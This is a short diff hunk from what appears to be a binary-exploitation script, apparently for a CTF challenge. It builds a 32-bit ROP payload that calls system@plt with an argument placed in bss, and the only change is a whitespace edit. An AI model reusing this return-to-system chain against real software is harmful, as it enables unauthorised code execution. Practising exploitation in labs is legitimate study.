@@ -58,7 +58,7 @@ payload += p32(0)
 payload += p32(bss)
 payload += p32(8)
 # system 실행
-payload += p32(system_plt)
+payload += p32(system_plt) 
 payload += b'C'*0x4
 payload += p32(bss)
 p.send(payload)
